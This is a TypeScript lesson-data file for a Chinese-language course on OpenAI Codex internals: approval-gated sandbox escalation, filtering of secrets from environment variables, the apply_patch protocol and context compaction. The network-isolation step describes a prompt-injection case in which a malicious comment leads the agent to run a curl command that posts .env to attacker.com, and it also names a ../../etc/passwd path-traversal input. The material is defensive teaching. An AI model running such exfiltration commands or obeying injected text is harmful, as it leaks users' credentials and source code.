        kpi('提权范围', '仅限当前单条命令', 'good'),
        kpi('never 模式', '永不升级，直接返回失败', 'good'),
      ],
      scene: swim(
        '沙箱失败 → 审批升级 → 重试成功时序',
        [
          { id: 'sbx', label: 'OS 沙箱', tone: 'blue' },
          { id: 'pol', label: 'Escalation 门', tone: 'orange' },
          { id: 'usr', label: '人类审批', tone: 'violet' },
          { id: 'host', label: '单次宿主机执行', tone: 'green' },
        ],
        [
          { id: 'a1', laneId: 'sbx', start: 5, end: 28, label: 'npm install → ENOTFOUND/EPERM', tone: 'rose', status: 'blocked' },
          { id: 'a2', laneId: 'pol', start: 30, end: 46, label: '识别为沙箱拦截', tone: 'orange', status: 'done' },
          { id: 'a3', laneId: 'usr', start: 48, end: 72, label: '明确展示命令与原因 → 批准', tone: 'violet', status: 'done' },
          { id: 'a4', laneId: 'host', start: 74, end: 95, label: '单次放行执行完毕，下条恢复沙箱', tone: 'green', status: 'done' },
        ],
      ),
    },
    {
      shortLabel: '显式提权声明',
      badge: 'TECHNIQUE',
      title: 'with_escalated_permissions：模型主动声明并附带理由',
      paragraphs: [
        '除了被动试错，Codex 还允许模型在调用 Shell 工具时主动携带 `sandbox_permissions: "require_escalated"` 和 `justification`（原因说明），直接说明「我需要访问网络拉取依赖」，把清晰的人类可读理由展示在审批弹窗里。',
      ],
      kpis: [
        kpi('主动声明', 'justification 理由字段', 'good'),
        kpi('人类可读性', '清晰解释为何越界', 'good'),
        kpi('后续恢复', '下条命令自动回沙箱', 'good'),
      ],
      scene: iso(
        '被动试错升级 vs 主动声明提权',
        [
          { id: 'p1', x: 80, y: 115, label: '被动路径', sublabel: '沙箱试跑失败 → 自动检测 EPERM', tone: 'blue', size: 'lg', icon: 'refresh-cw' },
          { id: 'p2', x: 80, y: 315, label: '主动路径', sublabel: '模型附带 justification 申请提权', tone: 'violet', size: 'lg', icon: 'message-square-text' },
          { id: 'ui', x: 520, y: 215, label: '统一审批弹窗', sublabel: '展示完整命令 + 原因 + 范围', tone: 'orange', size: 'lg', active: true, icon: 'shield' },
        ],
        [
          { from: 'p1', to: 'ui', packetCount: 1 },
          { from: 'p2', to: 'ui', status: 'active', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '切断外泄链',
      badge: 'INSIGHT',
      title: '网络零信任：为什么默认断网是防 Prompt 注入的杀手锏？',
      paragraphs: [
        '安全界著名的「致命三要素（Lethal Trifecta）」是：1. 访问私有数据（本地源码/密钥）+ 2. 接触不可信输入（网页/Issue/三方代码）+ 3. 对外通信能力（外网）。',
        'Codex 沙箱默认彻底切断第 3 要素（外网）：即使模型读了一段恶意注释被注入指令去 `curl https://attacker.com -d @.env`，内核也会在 `connect()` 阶段直接掐断外泄链！',
      ],
      callout: {
        kind: 'warn',
        title: '打破致命三要素',
        text: '只要子进程默认断网，任何未经人类显式批准的数据外传在物理上都不可能发生。',
      },
      kpis: [
        kpi('致命三要素', '默认切断外联环节', 'good'),
        kpi('Prompt 注入外泄', '物理阻断', 'good'),
        kpi('联网条件', '需配置或单次审批', 'neutral'),
      ],
      scene: iso(
        '默认断网打破 Prompt 注入数据外泄链',
        [
          { id: 'priv', x: 80, y: 100, label: '1 · 本地源码与凭据', tone: 'blue', icon: 'database' },
          { id: 'inj', x: 80, y: 320, label: '2 · 不可信外部内容', sublabel: 'Issue / 依赖代码里的注入文本', tone: 'orange', icon: 'alert-triangle' },
          { id: 'ag', x: 430, y: 210, label: '受诱导执行外传命令', tone: 'rose', size: 'lg', icon: 'terminal' },
          { id: 'cut', x: 770, y: 210, label: '3 · 外网被内核物理切断', sublabel: 'seccomp / Seatbelt → EPERM', tone: 'green', size: 'lg', active: true, icon: 'lock' },
        ],
        [
          { from: 'priv', to: 'ag', packetCount: 1 },
          { from: 'inj', to: 'ag', status: 'error', packetCount: 1 },
          { from: 'ag', to: 'cut', label: '外传被阻断', status: 'error', dashed: true, packetCount: 1, packetLabel: 'BLOCKED' },
        ],
      ),
    },
    {
      shortLabel: '环境变量清洗',
      badge: 'TECHNIQUE',
      title: 'ShellEnvironmentPolicy：连环境变量里的 API Key 也要过滤',
      paragraphs: [
        '除了文件和网络，父进程环境变量里常常躺着 `OPENAI_API_KEY`、`AWS_SECRET_ACCESS_KEY` 等敏感凭据。Codex 的 `ShellEnvironmentPolicy` 在拉起子进程前自动过滤匹配 `*KEY*`、`*SECRET*`、`*TOKEN*` 的环境变量，进一步缩小暴露面。',
      ],
      kpis: [
        kpi('敏感变量', '默认剥离 KEY/SECRET/TOKEN', 'good'),
        kpi('暴露面', '最小化子进程环境', 'good'),
        kpi('可配置', 'config.toml 细粒度白名单', 'neutral'),
      ],
      scene: iso(
        '子进程环境变量自动清洗',
        [
          { id: 'p', x: 100, y: 210, label: '父进程 Env', sublabel: 'PATH + HOME + OPENAI_API_KEY + AWS_SECRET', tone: 'orange', size: 'lg', icon: 'database' },
          { id: 'f', x: 440, y: 210, label: 'ShellEnvironmentPolicy', sublabel: '剔除 *KEY* / *SECRET* / *TOKEN*', tone: 'violet', size: 'lg', active: true, icon: 'shield' },
          { id: 'c', x: 770, y: 210, label: '沙箱子进程 Env', sublabel: '仅保留 PATH / HOME 等安全运行变量', tone: 'green', size: 'lg', icon: 'lock' },
        ],
        [
          { from: 'p', to: 'f', packetCount: 1 },
          { from: 'f', to: 'c', status: 'active', packetCount: 1, packetLabel: 'sanitized' },
        ],
      ),
    },
    {
      shortLabel: '零信任复盘',
      badge: 'RECAP',
      title: '升级重试与零信任复盘',
      paragraphs: [
        '安全与易用并非零和博弈：「默认断网 + 清洗环境 + 沙箱乐观试跑 + 按需单次提权」让 90% 的开发动作零打扰、10% 的越界操作清晰可控。',
      ],
      recapTable: [
        { question: '为什么先在沙箱试跑，失败后再问人类？', decision: '乐观沙箱执行 + 沙箱拒绝检测升级', because: '绝大多数命令不需要越权，大幅减少审批疲劳。' },
        { question: '默认断网最大的安全意义是什么？', decision: '切断「读私密数据 + 不可信输入 + 外传」三要素中的外传链', because: '即便遭遇间接 Prompt 注入也无法把源码和密钥发到外网。' },
        { question: '为什么还要清洗子进程环境变量？', decision: 'ShellEnvironmentPolicy 默认过滤 *KEY*/*SECRET*/*TOKEN*', because: '防止子进程读 env 拿到宿主凭据。' },
      ],
      kpis: [
        kpi('提权粒度', '单条命令', 'good'),
        kpi('网络默认', '零信任断网', 'good'),
        kpi('凭据清洗', '默认开启', 'good'),
      ],
      scene: iso('零信任复盘', [
        { id: 'a', x: 180, y: 200, label: '乐观沙箱跑', tone: 'green' },
        { id: 'b', x: 480, y: 200, label: '检测拒绝', tone: 'orange', active: true },
        { id: 'c', x: 780, y: 200, label: '审批单次提权', tone: 'violet' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH4 · 1/2 · apply_patch 补丁引擎与 TurnDiffTracker 变更追踪
// ---------------------------------------------------------------------------
const L_CODEX_PATCH = lesson(
  'codex-apply-patch',
  'codex-ch05',
  5,
  '代码补丁与长程上下文压缩',
  1,
  2,
  'apply_patch 补丁引擎与 TurnDiffTracker 变更追踪',
  'Codex 不用脆弱的 sed 或整文件重写改代码，而是设计了面向模型优化的自由格式补丁协议 apply_patch，并配以原子回滚与实时 Diff 追踪。',
  10,
  '核心',
  [
    { text: '理解 apply_patch 语法为何比标准 unified diff 更适合 LLM 生成', completedAtStep: 2 },
    { text: '掌握多文件补丁的校验与写入流程如何防止部分失败脏状态', completedAtStep: 4 },
    { text: '了解 TurnDiffTracker 如何在每一轮结束向 UI 推送统一工作区 Diff', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '行号幻觉',
      badge: 'PROBLEM',
      title: '标准 git diff 的 @@ -42,7 +42,9 @@ 是 LLM 的噩梦',
      paragraphs: [
        '标准 Unified Diff 要求模型在修改前就算出精确的起止行号与变更后总行数。LLM 极其擅长基于上下文文本定位，却非常不擅长数行号——稍微数错一行，`git apply` 就直接报错失败。',
        'Codex 专门打造了 `codex-apply-patch` crate：去掉易错的行号头，只用 `*** Begin Patch`、文件指令（`Add`/`Update`/`Delete`/`Move`）和少量上下文锚定行，一次调用即可跨多个文件精准编辑。',
      ],
      kpis: [
        kpi('专用 crate', 'codex-apply-patch', 'good'),
        kpi('行号依赖', '0（上下文锚定）', 'good'),
        kpi('单次跨文件', '支持增/改/删/重命名', 'good'),
      ],
      scene: iso(
        'apply_patch 解析与应用管线',
        [
          { id: 'txt', x: 70, y: 210, label: '自由格式 Patch 文本', sublabel: 'Update / Add / Delete 多文件块', tone: 'blue', size: 'lg', icon: 'file-text' },
          { id: 'par', x: 390, y: 210, label: 'apply_patch 解析 + 寻址', sublabel: '精确匹配 → 去尾空白回退 → 全文件验证', tone: 'violet', size: 'lg', active: true, icon: 'wrench' },
          { id: 'fs', x: 740, y: 110, label: '落盘写入 + 边界检查', sublabel: '校验路径不越出工作区', tone: 'green', icon: 'hard-drive' },
          { id: 'dt', x: 740, y: 315, label: 'TurnDiffTracker', sublabel: '生成统一 Diff 推给 EQ UI', tone: 'orange', active: true, icon: 'git-branch' },
        ],
        [
          { from: 'txt', to: 'par', status: 'active', packetCount: 1 },
          { from: 'par', to: 'fs', status: 'active', packetCount: 1, packetLabel: 'Write' },
          { from: 'fs', to: 'dt', status: 'active', packetCount: 1, packetLabel: 'TurnDiff' },
        ],
      ),
    },
    {
      shortLabel: '补丁语法与源码',
      badge: 'TECHNIQUE',
      title: '*** Begin Patch：简洁到模型几乎不会写错的 DSL',
      paragraphs: [
        '与标准 diff 相比，`apply_patch` 只需模型给出 `@@` 上下文符号名（例如函数签名）和带 `-`/`+`/空格前缀的片段，Rust 引擎负责在目标文件里做渐进式模糊定位（精确匹配 → 忽略行尾空白 → Unicode 标点归一化）。',
      ],
      sourceDrawer: codexSrc(
        'apply_patch 格式与 Hunk 应用逻辑',
        'codex-rs/apply-patch/src/lib.rs',
        'text',
        `*** Begin Patch
*** Update File: src/auth.rs
@@ fn verify_token(token: &str) -> Result<Claims>
-    if token.is_empty() { return Ok(Claims::guest()); }
+    if token.is_empty() { return Err(AuthError::MissingToken); }
     decode_jwt(token)
*** End Patch`,
        '无需人工计算行号，靠函数签名锚点 + 上下文行完成稳健定位。',
      ),
      kpis: [
        kpi('定位算法', '三阶段渐进匹配', 'good'),
        kpi('Token 消耗', '远低于整文件重写', 'good'),
        kpi('支持重命名', '*** Move to:', 'neutral'),
      ],
      scene: iso(
        'seek_sequence 三阶段渐进定位',
        [
          { id: 's1', x: 80, y: 210, label: '1 · 逐字精确匹配', tone: 'green', size: 'lg', active: true, icon: 'check-circle' },
          { id: 's2', x: 410, y: 210, label: '2 · 忽略行尾空白匹配', tone: 'blue', size: 'lg', icon: 'layers' },
          { id: 's3', x: 740, y: 210, label: '3 · Unicode 标点归一', tone: 'violet', size: 'lg', icon: 'wrench' },
        ],
        [
          { from: 's1', to: 's2', label: '未命中则降级', dashed: true, packetCount: 1 },
          { from: 's2', to: 's3', label: '未命中则降级', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '先验后写防脏盘',
      badge: 'SOLUTION',
      title: '内存全量校验通过后才写磁盘，拒绝半截补丁',
      paragraphs: [
        '如果一个补丁同时改 4 个文件，第 3 个文件上下文没匹配上怎么办？`apply_patch` 会先在内存中把所有文件的变更全部计算并校验通过（同时检查每个目标路径是否落在允许写入的工作区内，拦截 `../../etc/passwd` 路径穿越），确认零错误后再统一落盘。',
      ],
      kpis: [
        kpi('路径穿越防御', 'canonicalize 校验', 'good'),
        kpi('校验时机', '写盘前全量验证', 'good'),
        kpi('半截脏状态', '极大避免', 'good'),
      ],
      scene: swim(
        '多文件补丁的「先验后写」两阶段提交',
        [
          { id: 'mem', label: '内存校验阶段', tone: 'violet' },
          { id: 'sec', label: '路径安全门', tone: 'orange' },
          { id: 'disk', label: '磁盘写入阶段', tone: 'green' },
        ],
        [
          { id: 'm1', laneId: 'mem', start: 5, end: 42, label: '解析 4 个 Hunk 并在内存生成新内容', tone: 'violet', status: 'done' },
          { id: 's1', laneId: 'sec', start: 44, end: 64, label: '检查全部路径在 writable_roots 内', tone: 'orange', status: 'done' },
          { id: 'd1', laneId: 'disk', start: 66, end: 95, label: '全部校验通过 → 统一落盘写入', tone: 'green', status: 'done' },
        ],
      ),
    },
    {
      shortLabel: 'TurnDiffTracker',
      badge: 'TECHNIQUE',
      title: 'turn_diff_tracker.rs：实时汇总整轮工作区变更',
      paragraphs: [
        '一个 Turn 里模型可能先改一次 `auth.rs`，跑测试挂了又改第二次。如果把每次碎片修改原样扔给用户，审查体验极差。',
        '`codex-rs/core/src/turn_diff_tracker.rs` 在每个文件首次被触碰前拍下基线快照（Baseline Snapshot），随后任何时刻都能计算「相对于本轮开始时的净 Diff」，通过 `EventMsg::TurnDiff` 实时推给终端和 IDE Diff 面板！',
      ],
      kpis: [
        kpi('基线快照', '首次修改前记录', 'good'),
        kpi('输出形态', '本轮净 Unified Diff', 'good'),
        kpi('支持新文件', '含新增与删除文件', 'neutral'),
      ],
      scene: iso(
        'TurnDiffTracker 基线快照与净 Diff 计算',
        [
          { id: 'b', x: 80, y: 120, label: 'Turn 开始基线快照', sublabel: '首次触碰前缓存原始字节', tone: 'blue', size: 'lg', icon: 'database' },
          { id: 'e1', x: 80, y: 315, label: '多次编辑 + 重试', sublabel: 'Edit #1 → Edit #2 → Edit #3', tone: 'orange', size: 'lg', icon: 'wrench' },
          { id: 'trk', x: 460, y: 215, label: 'TurnDiffTracker', sublabel: 'diff(baseline, current_disk)', tone: 'violet', size: 'lg', active: true, icon: 'git-branch' },
          { id: 'ui', x: 790, y: 215, label: 'EventMsg::TurnDiff', sublabel: '前端实时展示净变更', tone: 'green', icon: 'terminal' },
        ],
        [
          { from: 'b', to: 'trk', packetCount: 1 },
          { from: 'e1', to: 'trk', status: 'active', packetCount: 2 },
          { from: 'trk', to: 'ui', status: 'active', packetCount: 1, packetLabel: '净 Diff' },
        ],
      ),
    },
    {
      shortLabel: '非 Git 目录也可用',
      badge: 'INSIGHT',
      title: '不依赖 git status，非 Git 目录也能精准算 Diff',
      paragraphs: [
        '因为 `TurnDiffTracker` 自己维护文件基线副本，即使在尚未 `git init` 的临时目录或存在大量未提交本地修改的仓库里，它也能精确剥离出「这一轮 Agent 到底动了哪几行」，不与开发者自己的未提交代码混淆。',
      ],
      kpis: [
        kpi('依赖 git', '否（自持基线快照）', 'good'),
        kpi('混合脏工作区', '精准区分 Agent 改动', 'good'),
        kpi('审查体验', '高信噪比', 'good'),
      ],
      scene: iso(
        '精准剥离开发者改动与 Agent 改动',
        [
          { id: 'u', x: 100, y: 120, label: '开发者原有未提交改动', tone: 'neutral', size: 'lg', icon: 'users' },
          { id: 'a', x: 100, y: 310, label: '本轮 Agent 改动', tone: 'green', size: 'lg', active: true, icon: 'cpu' },
          { id: 'out', x: 560, y: 215, label: 'TurnDiff 净视图', sublabel: '只高亮本轮 Agent 净变更，零干扰', tone: 'violet', size: 'lg', active: true, icon: 'eye' },
        ],
        [
          { from: 'u', to: 'out', label: '纳入基线（不干扰）', dashed: true, packetCount: 0 },
          { from: 'a', to: 'out', label: '精准呈现', status: 'active', packetCount: 2 },
        ],
      ),
    },
    {
      shortLabel: '补丁复盘',
      badge: 'RECAP',
      title: 'apply_patch 与变更追踪复盘',
      paragraphs: [
        '专为 LLM 认知特点设计的工具协议（去行号、上下文锚定、渐进匹配）+ `TurnDiffTracker` 净变更视图，大幅提升了编辑一次成功率与人类审查效率。',
      ],
      recapTable: [
        { question: '为什么不直接让模型输出标准 git unified diff？', decision: '设计去行号的 apply_patch 上下文锚定协议', because: 'LLM 极易数错行号导致 git apply 频繁失败。' },
        { question: '多文件补丁中途失败怎么避免改坏一半？', decision: '内存全量解析校验 + 路径越界检查通过后再统一落盘', because: '保证补丁变更的原子感与路径安全。' },
        { question: 'TurnDiffTracker 为什么不直接调 git diff？', decision: '在首次修改前自持基线快照', because: '能精准隔离开发者原有未提交改动，且在非 Git 目录同样工作。' },
      ],
      kpis: [
        kpi('协议 crate', 'codex-apply-patch', 'good'),
        kpi('变更追踪', 'TurnDiffTracker', 'good'),
        kpi('编辑成功率', '显著提升', 'good'),
      ],
      scene: iso('补丁引擎复盘', [
        { id: 'a', x: 200, y: 200, label: 'apply_patch', tone: 'violet' },
        { id: 'b', x: 500, y: 200, label: '先验后写', tone: 'green', active: true },
        { id: 'c', x: 800, y: 200, label: 'TurnDiffTracker', tone: 'orange' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH4 · 2/2 · compact.rs 长会话自动压缩与多端 App Server
// ---------------------------------------------------------------------------
const L_CODEX_COMPACT = lesson(
  'codex-auto-compact',
  'codex-ch05',
  5,
  '代码补丁与长程上下文压缩',
  2,
  2,
  'compact.rs 抗漂移三段压缩',
  '长程重构跑满上下文窗口时，codex-rs/core/src/compact.rs 如何通过服务端/本地摘要压缩重建紧凑历史，并配合 AGENTS.md 保持目标不漂移。',
  10,
  '进阶',
  [
    { text: '理解 Codex 达到 auto_compact 阈值后如何触发历史重塑', completedAtStep: 2 },
    { text: '掌握本地摘要压缩与服务端 /responses/compact 的协作策略', completedAtStep: 4 },
    { text: '看清 Codex 如何用单一 Rust 内核支撑 CLI、IDE 与后台任务生态', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '长程任务失忆',
      badge: 'PROBLEM',
      title: '持续跑 80 个工具调用，上下文溢出前的自动自救',
      paragraphs: [
        '在大型仓库里做跨模块重构，几十轮测试输出和文件内容很快逼近模型上下文上限。一旦超窗，API 直接拒收，整场重构前功尽弃。',
        '`codex-rs/core/src/compact.rs` 在每轮跟踪 `TokenUsage`：当估算上下文接近模型 `auto_compact_token_limit`（或用户手动触发 `Op::Compact`）时，自动执行无感压缩。',
      ],
      kpis: [
        kpi('源码模块', 'core/src/compact.rs', 'good'),
        kpi('触发方式', '自动阈值 + 手动 /compact', 'good'),
        kpi('用户保留', '保留近期关键用户意图', 'good'),
      ],
      scene: iso(
        'Codex 自动压缩触发与历史重建',
        [
          { id: 'mon', x: 80, y: 210, label: 'TokenUsage 监控', sublabel: '每轮比对 auto_compact_limit', tone: 'orange', size: 'lg', meter: { value: 88, label: '上下文占用' }, icon: 'clock' },
          { id: 'cmp', x: 420, y: 210, label: 'compact.rs 压缩器', sublabel: '提炼交接摘要 + 保留近期用户消息', tone: 'violet', size: 'lg', active: true, icon: 'layers' },
          { id: 'new', x: 760, y: 210, label: '重建后的紧凑 History', sublabel: '初始上下文 + 摘要 + 近期意图', tone: 'green', size: 'lg', icon: 'database' },
        ],
        [
          { from: 'mon', to: 'cmp', label: '触发阈值', status: 'active', packetCount: 1 },
          { from: 'cmp', to: 'new', label: '替换内存历史并记入 Rollout', status: 'active', packetCount: 2, packetLabel: 'Compacted' },
        ],
      ),
    },
    {
      shortLabel: '保留用户原始意图',
      badge: 'TECHNIQUE',
      title: 'build_compacted_history：绝不把用户原话全压丢',
      paragraphs: [
        '如果把全部历史统统压成一段 AI 自述，模型很容易丢失用户最初强调的细微约束。`compact.rs` 在重建历史时有三条铁律：',
        '1. 始终保留初始环境上下文（工作目录、`AGENTS.md`、沙箱状态）；2. 从后往前保留预算内的**真实用户消息原文**（`collect_user_messages`）；3. 将冗长的中间推理与工具输出凝练为一条结构化「交接摘要（Handoff Summary）」。',
      ],
      sourceDrawer: codexSrc(
        '压缩历史重建核心逻辑示意',
        'codex-rs/core/src/compact.rs',
        'rs',
        `pub fn build_compacted_history(
    initial_context: Vec<ResponseItem>,
    user_messages: &[String],
    summary_text: &str,
) -> Vec<ResponseItem> {
    let mut history = initial_context;
    // 在 Token 预算内保留最近的用户原话，防止需求漂移
    for msg in select_recent_within_budget(user_messages, COMPACT_USER_MESSAGE_MAX_TOKENS) {
        history.push(ResponseItem::user_text(msg));
    }
    // 追加结构化交接摘要（已完成改动、测试状态、剩余待办）
    history.push(ResponseItem::compaction_summary(summary_text));
    history
}`,
        '初始环境 + 预算内用户原话 + 结构化交接摘要三段式重建紧凑上下文。',
      ),
      kpis: [
        kpi('结构组成', '环境 + 用户原话 + 交接摘要', 'good'),
        kpi('需求防漂移', '明确保留近期用户原话', 'good'),
        kpi('Rollout 记录', '写入 CompactedItem 事件', 'neutral'),
      ],
      scene: swim(
        '压缩前后的上下文窗口对比',
        [
          { id: 'bef', label: '压缩前 (180K)', tone: 'orange' },
          { id: 'aft', label: '压缩后 (24K)', tone: 'green' },
        ],
        [
          { id: 'b1', laneId: 'bef', start: 2, end: 14, label: 'AGENTS.md', tone: 'blue', status: 'done' },
          { id: 'b2', laneId: 'bef', start: 15, end: 96, label: '70 轮推理 + 庞大工具日志 + Diff 噪音', tone: 'orange', status: 'blocked' },
          { id: 'a1', laneId: 'aft', start: 2, end: 14, label: 'AGENTS.md', tone: 'blue', status: 'done' },
          { id: 'a2', laneId: 'aft', start: 15, end: 26, label: '近期用户原话', tone: 'violet', status: 'done' },
          { id: 'a3', laneId: 'aft', start: 27, end: 40, label: '交接摘要', tone: 'green', status: 'running' },
        ],
      ),
    },
    {
      shortLabel: '本地与远程双压缩',
      badge: 'SOLUTION',
      title: 'Remote Compact 优先，本地摘要自动兜底',
      paragraphs: [
        '针对 OpenAI Responses API，Codex 还支持调用原生远端 `/responses/compact` 端点，生成可保留隐式推理状态（Encrypted Compaction Item）的紧凑上下文；对于第三方或自定义 OpenAI 兼容模型，则无缝退回到本地提示词摘要流程。',
      ],
      kpis: [
        kpi('OpenAI 原生', 'Remote Compact 保留推理态', 'good'),
        kpi('通用模型', '本地交接摘要无缝兜底', 'good'),
        kpi('客户端透明', '统一发射 ContextCompacted', 'neutral'),
      ],
      scene: iso(
        '远端原生压缩与本地摘要双路径',
        [
          { id: 'req', x: 80, y: 210, label: '触发 Compact', tone: 'orange', size: 'lg', icon: 'refresh-cw' },
          { id: 'rem', x: 460, y: 110, label: 'Remote Compact API', sublabel: 'OpenAI 原生加密压缩项', tone: 'violet', size: 'lg', active: true, icon: 'globe' },
          { id: 'loc', x: 460, y: 315, label: 'Local Summary Compact', sublabel: '结构化交接提示词（兼容任意模型）', tone: 'blue', size: 'lg', icon: 'cpu' },
          { id: 'ev', x: 800, y: 210, label: 'EventMsg::ContextCompacted', tone: 'green', icon: 'check-circle' },
        ],
        [
          { from: 'req', to: 'rem', label: '支持原生端点', status: 'active', packetCount: 1 },
          { from: 'req', to: 'loc', label: '通用兼容回退', dashed: true, packetCount: 1 },
          { from: 'rem', to: 'ev', status: 'active', packetCount: 1 },
          { from: 'loc', to: 'ev', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'AGENTS.md 持久锚点',
      badge: 'TECHNIQUE',
      title: 'AGENTS.md 与多级配置层（config.toml）',
      paragraphs: [
        '无论会话压缩多少次，项目根目录与用户目录的 `AGENTS.md`（编码规范、测试命令、禁止事项）和 `~/.codex/config.toml`（默认模型、审批策略、MCP 服务、沙箱规则）都属于初始环境层，永远处于上下文最稳固的锚点位置，不会被压丢。',
      ],
      kpis: [
        kpi('配置文件', '~/.codex/config.toml', 'neutral'),
        kpi('指令锚点', 'AGENTS.md（抗压缩）', 'good'),
        kpi('MCP 接入', 'config.toml 统一声明', 'good'),
      ],
      scene: tree(
        'Codex 多层配置与指令优先级',
        [
          { id: 'm', x: 500, y: 60, kind: 'root', label: '系统 / 企业托管策略 (MDM)', status: 'active' },
          { id: 'u', x: 500, y: 185, kind: 'service', label: '~/.codex/config.toml + AGENTS.md', parentId: 'm', status: 'done' },
          { id: 'p', x: 500, y: 315, kind: 'plugin', label: '项目 .codex/ + repo/AGENTS.md', parentId: 'u', status: 'done' },
          { id: 'c', x: 500, y: 445, kind: 'event', label: 'CLI 参数覆盖 (-a / -s / -m)', parentId: 'p', status: 'highlight' },
        ],
        [
          { from: 'm', to: 'u' },
          { from: 'u', to: 'p', animated: true },
          { from: 'p', to: 'c', animated: true },
        ],
      ),
    },
    {
      shortLabel: '多端与子 Agent 协作',
      badge: 'INSIGHT',
      title: '从单终端到多 Worktree 并行协作',
      paragraphs: [
        '基于 `codex-app-server` 的 Thread / Turn 协议，现代 Codex 桌面与 IDE 端可以在多个独立 Git Worktree 沙箱中并行托管多个线程：每个线程拥有独立的 `TurnContext`、独立的 `SandboxPolicy` 和独立的 `TurnDiffTracker`，完成后集中审阅合并。',
      ],
      kpis: [
        kpi('线程模型', 'Thread → Turn → Item', 'good'),
        kpi('隔离单元', '独立 Worktree + OS 沙箱', 'good'),
        kpi('协议统一', 'codex-app-server', 'good'),
      ],
      scene: iso(
        'codex-app-server 托管多并发工作线程',
        [
          { id: 'app', x: 80, y: 215, label: 'codex-app-server', sublabel: 'JSON-RPC Thread 管理器', tone: 'violet', size: 'lg', active: true, icon: 'globe' },
          { id: 'w1', x: 480, y: 95, label: 'Thread #1 (Worktree A)', sublabel: '功能开发 · workspace-write', tone: 'green', size: 'lg', icon: 'git-branch' },
          { id: 'w2', x: 480, y: 225, label: 'Thread #2 (Worktree B)', sublabel: 'Bug 修复 · workspace-write', tone: 'blue', size: 'lg', icon: 'git-branch' },
          { id: 'w3', x: 480, y: 355, label: 'Thread #3 (ReadOnly)', sublabel: '安全审计 · read-only', tone: 'orange', size: 'lg', icon: 'eye' },
        ],
        [
          { from: 'app', to: 'w1', status: 'active', packetCount: 1 },
          { from: 'app', to: 'w2', status: 'active', packetCount: 1 },
          { from: 'app', to: 'w3', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'Codex 全课复盘',
      badge: 'RECAP',
      title: 'OpenAI Codex 架构全景复盘',
      paragraphs: [
        'Codex（`codex-rs`）展示了「系统级工程思维」做 Agent Harness 的典范：强类型异步双队列、二维正交安全策略、原生内核沙箱、去行号补丁协议与抗漂移长程压缩。',
      ],
      recapTable: [
        { question: 'Codex 最核心的架构护城河是什么？', decision: 'Rust 内核 + 原生 OS 沙箱（Seatbelt/Landlock）+ 二维正交策略', because: '在零容器开销的前提下实现了默认断网与物理写盘边界。' },
        { question: '长程压缩如何防止模型忘掉用户最初诉求？', decision: '初始环境 + 预算内用户原话 + 结构化交接摘要三段重建', because: '同时保留硬约束、真实意图与阶段性进展。' },
        { question: '与 Pi 相比，Codex 的侧重点有何不同？', decision: 'Codex 强在系统级安全隔离与多端协议，Pi 强在极简双队列与 TS 扩展', because: '前者面向高自治生产安全边界，后者面向极致灵活的个人极客流。' },
      ],
      kpis: [
        kpi('全课覆盖', '4 章 8 课 48 步', 'good'),
        kpi('核心仓库', 'openai/codex', 'good'),
        kpi('核心哲学', '内核隔离 · 策略正交', 'good'),
      ],
      scene: iso('Codex 全景', [
        { id: 'c1', x: 140, y: 210, label: 'SQ / EQ 协议', tone: 'blue' },
        { id: 'c2', x: 440, y: 210, label: 'Approval × Sandbox', tone: 'violet', active: true },
        { id: 'c3', x: 740, y: 210, label: 'Patch + Compact', tone: 'green', active: true },
      ], [
        { from: 'c1', to: 'c2', packetCount: 1 },
        { from: 'c2', to: 'c3', packetCount: 1 },
      ]),
    },
  ]),
);

export const CODEX_CHAPTERS: Chapter[] = [
  chapter('codex-ch01', 1, 'Workspace 与双队列协议', 'violet', [L_CODEX_SQ_EQ]),
  chapter('codex-ch02', 2, 'Core 控制面与 Turn 循环', 'blue', [L_CODEX_TURN]),
  chapter('codex-ch03', 3, '二维正交策略与 ExecPolicy', 'amber', [L_CODEX_POLICY, L_CODEX_EXEC_POLICY]),
  chapter('codex-ch04', 4, 'OS 原生内核沙箱与零信任', 'sage', [L_CODEX_SANDBOX, L_CODEX_ESCALATION]),
  chapter('codex-ch05', 5, '代码补丁与长程上下文压缩', 'coral', [L_CODEX_PATCH, L_CODEX_COMPACT]),
  chapter('codex-ch06', 6, '配置层、MCP 与多端协作生态', 'teal', [L_CODEX_CONFIG_MCP, L_CODEX_APP_SERVER]),
];
